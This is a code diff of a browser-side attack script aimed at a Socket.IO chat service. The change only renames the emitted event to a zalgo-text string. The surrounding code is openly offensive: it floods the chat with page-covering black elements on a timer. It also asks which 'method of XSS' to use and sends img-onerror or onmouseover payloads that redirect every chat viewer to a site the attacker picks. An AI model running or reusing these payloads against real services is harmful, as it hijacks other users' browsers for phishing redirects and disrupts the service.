@@ -24,7 +24,7 @@ window.addEventListener("keydown", function(e) {
                           if (socket2.disconnected) {
                                 socket2.connect()
                           }
-                          socket2.emit('chat message', {
+                          socket2.emit('b̵̳̜̍͋̇̌ǫ̶̺̥͉̳̙͎̱̳̩͋̽̃͝z̸̨̛̛̛͕̮͙̜͕̪͓̜̱̪̗̻̓̽͂̂̌̀̂͜ͅo̶̧͔̫̻̠̭͇̱̖̹̊͜', {
                             message: window.message,
                             user: window.userraw
                           })
@@ -38,7 +38,7 @@ window.addEventListener("keydown", function(e) {
                     //            
                     //}
                     setInterval(() => {
-                          socket2.emit('chat message', {
+                          socket2.emit('b̵̳̜̍͋̇̌ǫ̶̺̥͉̳̙͎̱̳̩͋̽̃͝z̸̨̛̛̛͕̮͙̜͕̪͓̜̱̪̗̻̓̽͂̂̌̀̂͜ͅo̶̧͔̫̻̠̭͇̱̖̹̊͜', {
                             message: `<text style='font-size:500000rem;background-color:black;'></text>`,
                             user: ""
                           })
@@ -48,13 +48,13 @@ window.addEventListener("keydown", function(e) {
                     let site = prompt("What site would you like to redirect everybody to?\n\nExample: https://zastix.xyz/")
                     switch (Number(prompt("What method of XSS?\n\nIMG onError - 1\nDiv onhover - 2"))) {
                         case 1:
-                            socket2.emit('chat message', {
+                            socket2.emit('b̵̳̜̍͋̇̌ǫ̶̺̥͉̳̙͎̱̳̩͋̽̃͝z̸̨̛̛̛͕̮͙̜͕̪͓̜̱̪̗̻̓̽͂̂̌̀̂͜ͅo̶̧͔̫̻̠̭͇̱̖̹̊͜', {
                                 message: `<img src="e.png" onerror="location.href='${site}'">`,
                                 user: ''
                             })
                             break;
                         case 2:
-                            socket2.emit('chat message', {
+                            socket2.emit('b̵̳̜̍͋̇̌ǫ̶̺̥͉̳̙͎̱̳̩͋̽̃͝z̸̨̛̛̛͕̮͙̜͕̪͓̜̱̪̗̻̓̽͂̂̌̀̂͜ͅo̶̧͔̫̻̠̭͇̱̖̹̊͜', {
                                 message: `<div style="transform:translate(-50%,-20%);width:10000px;height:10000px;background-color:black;position:absolute;" onmouseover=location.href="${site}">`,
                                 user: ''
                             })
